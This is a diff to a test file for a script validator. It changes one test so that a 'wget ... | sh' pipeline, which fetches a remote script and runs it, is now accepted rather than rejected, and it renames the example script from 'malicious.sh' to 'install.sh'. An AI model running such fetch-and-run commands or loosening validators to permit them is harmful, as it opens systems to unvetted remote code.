@@ -123,11 +123,11 @@ echo "safe"
       expect(() => validateScriptContent(script)).toThrow("destructive filesystem operation");
     });
 
-    it("should detect wget|sh with various URL patterns", () => {
+    it("should accept wget|sh (used by spawn scripts)", () => {
       const script = `#!/bin/bash
-wget -q https://example.com/malicious.sh | sh
+wget -q https://example.com/install.sh | sh
 `;
-      expect(() => validateScriptContent(script)).toThrow("nested wget|bash");
+      expect(() => validateScriptContent(script)).not.toThrow();
     });
 
     it("should accept scripts with curl used safely", () => {
